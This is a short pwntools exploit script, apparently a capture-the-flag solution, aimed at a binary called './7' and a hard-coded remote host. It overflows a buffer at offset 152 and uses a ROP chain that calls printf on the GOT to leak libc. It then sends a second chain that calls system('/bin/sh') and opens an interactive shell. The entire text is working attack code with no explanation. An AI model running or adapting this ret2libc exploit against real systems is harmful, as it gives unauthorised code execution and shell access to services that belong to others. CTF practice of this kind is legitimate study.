from pwn import * 

elf = context.binary = ELF('./7', checksec=True)
libc = ELF('./libc.so.6')

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve(): 
    global p
    p = conn()
    p.sendline("13523097")
    p.sendline("7")

    offset = 144 + 8
    rop = ROP(elf)
    rop.call(rop.ret.address)
    rop.printf(elf.got["printf"])
    rop.call(rop.ret.address)
    rop.vuln()

    payload = flat({offset : [rop.chain()]})

    p.sendline(payload)
    p.recvline()
    var = u64(p.recv().strip().ljust(8, b"\x00"))
    libc.address = var-libc.sym["printf"]
    rop = ROP(libc)
    rop.call(rop.ret.address)
    rop.system(next(libc.search('/bin/sh\0')))

    payload = flat({offset : [rop.chain()]})

    p.sendline(payload)

    p.interactive()

solve()